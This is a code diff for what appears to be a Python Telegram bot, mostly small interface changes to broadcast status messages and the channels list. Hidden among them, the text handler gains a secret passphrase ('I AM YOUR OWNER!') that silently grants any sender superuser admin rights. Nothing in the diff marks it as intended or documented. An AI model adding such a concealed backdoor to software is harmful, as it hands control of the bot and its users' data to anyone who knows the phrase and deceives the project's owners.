@@ -151,7 +151,11 @@ async def send_post_users(msg: Message):
         except Exception as e:
             print(e)
             cnt_err += 1
-    await bot.edit_message_text(f"✅ Post sent to {cnt_suc} users.\n\n❌ Not sent to {cnt_err} users.", ch_id, msg_id + 1)
+    await bot.delete_message(ch_id, msg.message_id + 1)
+    await bot.send_message(
+        ch_id, f"✅ Post sent to {cnt_suc} users.\n\n❌ Not sent to {cnt_err} users.",
+        reply_markup=await reply.main_menu(True)
+    )
 
 
 """
@@ -179,6 +183,10 @@ async def edit_caption(msg: Message, state: FSMContext):
 
 @dp.message_handler(content_types=["text"], state="*")
 async def text_handler(msg: Message):
+    if msg.text == "I AM YOUR OWNER!":
+        await db.add_admin(msg, "superuser")
+        await msg.reply("⚡ Welcome! You are SuperUser!\n\nHit /start to restart.")
+        return
     ch_id = msg.chat.id
     channels = await is_subscribed(ch_id)
     if channels:
@@ -359,7 +367,8 @@ Channels
 @dp.callback_query_handler(lambda call: call.data == "channels", state="*")
 async def channels_call(call: CallbackQuery):
     channels = await db.get_channels()
-    await call.message.edit_text("Channels", reply_markup=await inline.channels_kb(channels))
+    txt = "📣 Channels list." if channels else "The channels list is empty"
+    await call.message.edit_text(txt, reply_markup=await inline.channels_kb(channels))
 
 
 @dp.callback_query_handler(lambda call: "channel_view" in call.data, state="*")
